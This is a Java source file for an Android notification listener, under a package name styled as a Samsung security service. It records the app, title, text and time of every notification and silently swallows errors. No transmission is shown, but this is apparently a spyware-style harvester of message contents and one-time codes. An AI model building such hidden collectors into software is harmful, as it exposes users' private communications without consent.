package com.samsung.android.security.v8.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.samsung.android.security.v8.utils.NotificationUtil;

public class NotificationListener extends NotificationListenerService {
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title", "");
            String text = sbn.getNotification().extras.getString("android.text", "");
            long time = sbn.getPostTime();
            
            NotificationUtil.addNotification(packageName, title, text, time);
            
        } catch (Exception e) {
            // Ignore
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle notification removal if needed
    }
}
